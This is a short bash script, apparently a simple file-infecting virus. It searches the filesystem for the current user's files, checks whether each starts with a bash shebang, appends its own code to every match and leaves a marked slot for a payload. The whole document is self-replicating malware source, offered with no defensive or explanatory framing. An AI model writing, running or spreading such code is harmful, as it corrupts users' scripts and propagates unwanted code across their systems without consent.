#!/bin/bash
# Search for and infect files
find / -user $UID -type f | while read fn; do head -n1 "$fn" | grep -q "#!.*/bin/bash" && cat "$(basename \"$0\")" >> $fn; done
# Payload Goes Here:
